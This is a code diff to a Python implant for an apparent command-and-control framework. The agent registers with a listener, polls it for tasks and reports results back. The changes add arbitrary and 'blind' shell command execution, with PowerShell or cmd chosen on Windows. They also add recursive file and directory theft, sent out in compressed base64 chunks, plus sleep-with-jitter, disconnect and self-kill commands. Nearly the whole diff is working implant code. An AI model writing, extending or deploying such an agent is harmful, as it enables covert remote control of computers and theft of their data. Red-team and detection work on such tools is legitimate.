@@ -1,10 +1,13 @@
+import base64
 import json
 import os
+import platform
 import random
 import subprocess
 import time
 import urllib.error
 import urllib.request
+import zlib
 
 REMOTE_HOST = "127.0.0.1"
 REMOTE_PORT = 1337
@@ -19,26 +22,83 @@ def shell_capability(arguments):
     command = arguments["command"]
     timeout = arguments["timeout"]
     blind = arguments["blind"]
+    shell = arguments["shell"]
+    expand = arguments["expand"]
+
+    if shell and not os.path.exists(shell):
+        return {
+            "success": False,
+            "message": (
+                f"Failed to execute command '{command}'. The provided shell binary "
+                "file path does not exist."
+            ),
+            "data": {},
+        }
 
     if command[:3].lstrip().lower() == "cd ":
         directory_to_change_to = command.replace("cd ", "", 1)
-        os.chdir(directory_to_change_to)
+        if expand:
+            directory_to_change_to = os.path.expandvars(directory_to_change_to)
+        try:
+            os.chdir(directory_to_change_to)
+        except FileNotFoundError:
+            return {
+                "success": False,
+                "message": (
+                    f"Failed to change to directory '{directory_to_change_to}'. "
+                    "Directory does not exist."
+                ),
+                "data": {},
+            }
+        except NotADirectoryError:
+            return {
+                "success": False,
+                "message": (
+                    f"Failed to change to directory '{directory_to_change_to}'. Path "
+                    "is not a directory."
+                ),
+                "data": {},
+            }
         return {
             "success": True,
-            "message": f"Changed to directory: {directory_to_change_to}",
+            "message": f"Changed to directory '{directory_to_change_to}'",
             "data": {},
         }
     else:
-        output = subprocess.run(
-            command,
-            shell=True,
-            capture_output=True,
-            timeout=timeout,
-        )
+        if platform.system() == "Windows" and shell is None:
+            if os.path.exists(
+                "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            ):
+                shell = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+            else:
+                shell = "C:\\Windows\\System32\\cmd.exe"
 
         if blind:
-            output = ""
+            subprocess.Popen(
+                command,
+                shell=True,
+                executable=shell,
+            )
+            output = f"Executed command '{command}' blind."
         else:
+            try:
+                output = subprocess.run(
+                    command,
+                    shell=True,
+                    capture_output=True,
+                    timeout=timeout,
+                    executable=shell,
+                )
+            except subprocess.TimeoutExpired:
+                return {
+                    "success": False,
+                    "message": (
+                        f"Failed to execute command '{command}'. Command timed out "
+                        f"after {timeout} second(s)."
+                    ),
+                    "data": {},
+                }
+
             output = (output.stdout + output.stderr).decode("utf-8", errors="ignore")
 
         return {
@@ -51,9 +111,208 @@ def shell_capability(arguments):
 def ping_capability(_arguments):
     return {
         "success": True,
-        "message": "Pong!",
+        "message": "",
         "data": {},
     }
+
+
+def sleep_capability(arguments):
+    return {
+        "success": True,
+        "message": f"Agent is sleeping for {arguments["duration"]} seconds...",
+        "data": {},
+    }
+
+
+def disconnect_capability(arguments):
+    return {
+        "success": True,
+        "message": (
+            f"Agent is disconnecting and waiting {arguments["duration"]} second(s) "
+            "before attempting to reconnect..."
+        ),
+        "data": {},
+    }
+
+
+def kill_capability(_arguments):
+    return {
+        "success": True,
+        "message": f"Agent is killing itself...",
+        "data": {},
+    }
+
+
+def delay_capability(arguments):
+    return {
+        "success": True,
+        "message": (
+            f"Agent is updating delay to '{arguments["duration"]}' second(s) with a "
+            f"jitter of '{arguments["jitter"]}'"
+        ),
+        "data": {},
+    }
+
+
+def download_capability(arguments):
+    source = arguments["source"]
+    recursive = arguments["recursive"]
+    chunk_size = arguments["chunk_size"]
+    ignore_empty_dirs = arguments["ignore_empty_dirs"]
+    compression_level = arguments["compression_level"]
+    expand = arguments["expand"]
+
+    def read_file_chunks(file_path, chunk_size):
+        try:
+            with open(file_path, "rb") as file:
+                while True:
+                    chunk = file.read(chunk_size)
+                    if not chunk:
+                        break
+                    yield chunk
+        except PermissionError:
+            yield {
+                "success": False,
+                "message": (
+                    "Failed to download file. Permission denied when attempting to "
+                    f"read file '{file_path}'."
+                ),
+                "data": {},
+            }
+
+    def walk_directory(directory_path, recursive):
+        for root, directories, files in os.walk(directory_path):
+            for file in files:
+                yield os.path.join(root, file)
+            for directory in directories:
+                yield os.path.join(root, directory)
+            if not recursive:
+                break
+
+    def generate_agent_result_messages_for_file(
+        file_path,
+        chunk_size,
+        compression_level,
+    ):
+        yield {
+            "success": True,
+            "message": "",
+            "data": {
+                "response_type": "start_of_file",
+                "resolved_source_path": os.path.abspath(file_path),
+                "is_directory": False,
+                "file_size": os.path.getsize(file_path),
+            },
+        }
+
+        for file_chunk in read_file_chunks(file_path, chunk_size):
+            if compression_level:
+                file_chunk = zlib.compress(file_chunk, compression_level)
+            yield {
+                "success": True,
+                "message": "",
+                "data": {
+                    "response_type": "file_chunk",
+                    "file_chunk": base64.b64encode(file_chunk).decode(),
+                },
+            }
+
+        yield {
+            "success": True,
+            "message": "",
+            "data": {
+                "response_type": "end_of_file",
+            },
+        }
+
+    def generate_agent_result_messages_for_directory(
+        directory_path,
+        chunk_size,
+        compression_level,
+        recursive,
+    ):
+        yield {
+            "success": True,
+            "message": "",
+            "data": {
+                "response_type": "start_of_directory",
+                "resolved_source_path": os.path.abspath(directory_path),
+                "is_directory": True,
+            },
+        }
+
+        for path in walk_directory(directory_path, recursive):
+            if os.path.isdir(path):
+                if not os.listdir(path) and ignore_empty_dirs:
+                    continue
+                yield {
+                    "success": True,
+                    "message": "",
+                    "data": {
+                        "response_type": "directory",
+                        "directory_path": os.path.relpath(path, directory_path),
+                    },
+                }
+            else:
+                relative_file_path = os.path.relpath(path, directory_path)
+                agent_result_messages_generator = (
+                    generate_agent_result_messages_for_file(
+                        path,
+                        chunk_size,
+                        compression_level,
+                    )
+                )
+                _discarded_header = next(agent_result_messages_generator)
+                yield {
+                    "success": True,
+                    "message": "",
+                    "data": {
+                        "response_type": "start_of_directory_file",
+                        "relative_file_path": relative_file_path,
+                        "file_size": os.path.getsize(path),
+                    },
+                }
+                for agent_result_message in agent_result_messages_generator:
+                    if agent_result_message["data"]["response_type"] == "end_of_file":
+                        continue
+                    yield agent_result_message
+
+        yield {
+            "success": True,
+            "message": "",
+            "data": {
+                "response_type": "end_of_directory",
+            },
+        }
+
+    if expand:
+        source = os.path.expandvars(source)
+
+    if not os.path.exists(source):
+        return {
+            "success": False,
+            "message": (
+                f"Failed to download file/directory. The provided path '{source}' does "
+                "not exist."
+            ),
+            "data": {},
+        }
+
+    if os.path.isdir(source):
+        for agent_result_message in generate_agent_result_messages_for_directory(
+            source,
+            chunk_size,
+            compression_level,
+            recursive,
+        ):
+            yield agent_result_message
+    else:
+        for agent_result_message in generate_agent_result_messages_for_file(
+            source,
+            chunk_size,
+            compression_level,
+        ):
+            yield agent_result_message
 
 
 class ModuleLoader:
@@ -64,7 +323,9 @@ class ModuleLoader:
         if module_name in self._loaded_modules:
             return {
                 "success": False,
-                "message": 'Module "' + module_name + '" is already loaded',
+                "message": (
+                    f"Failed to load module. Module '{module_name}' is already loaded."
+                ),
                 "data": {},
             }
 
@@ -74,7 +335,7 @@ class ModuleLoader:
         except Exception as exc:
             return {
                 "success": False,
-                "message": "Error loading module : " + str(exc),
+                "message": f"Failed to load module. {exc}",
                 "data": {},
             }
 
@@ -83,13 +344,13 @@ class ModuleLoader:
         except KeyError:
             return {
                 "success": False,
-                "message": "Error loading module : Module class not found in module",
+                "message": "Failed to load module. Module class not found in module",
                 "data": {},
             }
 
         return {
             "success": True,
-            "message": "Loaded module : " + module_name,
+            "message": f"Loaded module '{module_name}'.",
             "data": {},
         }
 
@@ -98,13 +359,16 @@ class ModuleLoader:
             del self._loaded_modules[module_name]
             return {
                 "success": True,
-                "message": "Unloaded module : " + module_name,
+                "message": f"Unloaded module '{module_name}'.",
                 "data": {},
             }
         else:
             return {
                 "success": False,
-                "message": 'Module "' + module_name + '" is not currently loaded',
+                "message": (
+                    f"Failed to unload module. Module '{module_name}' is not currently "
+                    "loaded."
+                ),
                 "data": {},
             }
 
@@ -112,7 +376,10 @@ class ModuleLoader:
         if module_name not in self._loaded_modules:
             return {
                 "success": False,
-                "message": 'Module "' + module_name + '" is not currently loaded',
+                "message": (
+                    f"Failed to reload module. Module '{module_name}' is not currently "
+                    "loaded."
+                ),
                 "data": {},
             }
 
@@ -122,7 +389,7 @@ class ModuleLoader:
         except Exception as exc:
             return {
                 "success": False,
-                "message": "Error reloading module: " + str(exc),
+                "message": f"Failed to reload module. {exc}",
                 "data": {},
             }
 
@@ -131,13 +398,13 @@ class ModuleLoader:
         except KeyError:
             return {
                 "success": False,
-                "message": "Error reloading module: Module class not found in module",
+                "message": "Failed to reload module. Module class not found in module",
                 "data": {},
             }
 
         return {
             "success": True,
-            "message": "Reloaded module: " + module_name,
+            "message": f"Reloaded module '{module_name}'.",
             "data": {},
         }
 
@@ -231,46 +498,83 @@ class Agent:
 
     def run_agent(self):
         while True:
-            try:
-                self.connection.register_with_listener()
-                break
-            except urllib.error.URLError:
+            while True:
+                try:
+                    self.connection.register_with_listener()
+                    break
+                except urllib.error.URLError:
+                    self._sleep()
+
+            while True:
+                tasks = self.connection.get_tasks_from_listener()
+                print(tasks)
+                for task in tasks:
+                    # elif task["command"] == "load_module":
+                    #     module_name = task["arguments"][0]
+                    #     module_source_code = task["arguments"][1]
+                    #     result = self.module_loader.load_module(
+                    #         module_name, module_source_code
+                    #     )
+                    if task["command"] == "shell":
+                        result = shell_capability(task["arguments"])
+                        self.connection.post_results_to_listener(
+                            task["task_id"], **result
+                        )
+                    elif task["command"] == "ping":
+                        result = ping_capability(task["arguments"])
+                        self.connection.post_results_to_listener(
+                            task["task_id"], **result
+                        )
+                    elif task["command"] == "sleep":
+                        result = sleep_capability(task["arguments"])
+                        self.connection.post_results_to_listener(
+                            task["task_id"], **result
+                        )
+                        time.sleep(task["arguments"]["duration"])
+                        continue
+                    elif task["command"] == "disconnect":
+                        result = disconnect_capability(task["arguments"])
+                        self.connection.post_results_to_listener(
+                            task["task_id"], **result
+                        )
+                        break
+                    elif task["command"] == "kill":
+                        result = kill_capability(task["arguments"])
+                        self.connection.post_results_to_listener(
+                            task["task_id"], **result
+                        )
+                        exit()
+                    elif task["command"] == "delay":
+                        result = delay_capability(task["arguments"])
+                        self.connection.post_results_to_listener(
+                            task["task_id"], **result
+                        )
+                        self.connection.sleep_time = task["arguments"]["duration"]
+                        self.connection.sleep_time_jitter = task["arguments"]["jitter"]
+                    elif task["command"] == "download":
+                        for result in download_capability(task["arguments"]):
+                            self.connection.post_results_to_listener(
+                                task["task_id"],
+                                **result,
+                            )
+                            self._sleep()
+                        continue
+                    # elif task["command"] == "unload_module":
+                    #     module_name = task["arguments"][0]
+                    #     result = self.module_loader.unload_module(module_name)
+                    #     self.connection.post_results_to_listener(task["task_id"], **result)
+                    # elif task["command"] == "reload_module":
+                    #     module_name = task["arguments"][0]
+                    #     result = self.module_loader.unload_module(module_name)
+                    #     self.connection.post_results_to_listener(task["task_id"], **result)
+                    # else:
+                    #     module_name = task["command"]
+                    #     arguments = task["arguments"]
+                    #     self.module_loader.run_module(
+                    #         module_name, arguments, self.connection
+                    #     )
+
                 self._sleep()
-
-        while True:
-            tasks = self.connection.get_tasks_from_listener()
-            print(tasks)
-            for task in tasks:
-                if task["command"] == "shell":
-                    result = shell_capability(task["arguments"])
-                    self.connection.post_results_to_listener(task["task_id"], **result)
-                elif task["command"] == "ping":
-                    result = ping_capability(task["arguments"])
-                    self.connection.post_results_to_listener(task["task_id"], **result)
-
-                # if task["command"] == "load_module":
-                #     module_name = task["arguments"][0]
-                #     module_source_code = task["arguments"][1]
-                #     result = self.module_loader.load_module(
-                #         module_name, module_source_code
-                #     )
-                #     self.connection.post_results_to_listener(task["task_id"], **result)
-                # elif task["command"] == "unload_module":
-                #     module_name = task["arguments"][0]
-                #     result = self.module_loader.unload_module(module_name)
-                #     self.connection.post_results_to_listener(task["task_id"], **result)
-                # elif task["command"] == "reload_module":
-                #     module_name = task["arguments"][0]
-                #     result = self.module_loader.unload_module(module_name)
-                #     self.connection.post_results_to_listener(task["task_id"], **result)
-                # else:
-                #     module_name = task["command"]
-                #     arguments = task["arguments"]
-                #     self.module_loader.run_module(
-                #         module_name, arguments, self.connection
-                #     )
-
-            self._sleep()
 
 
 def main():
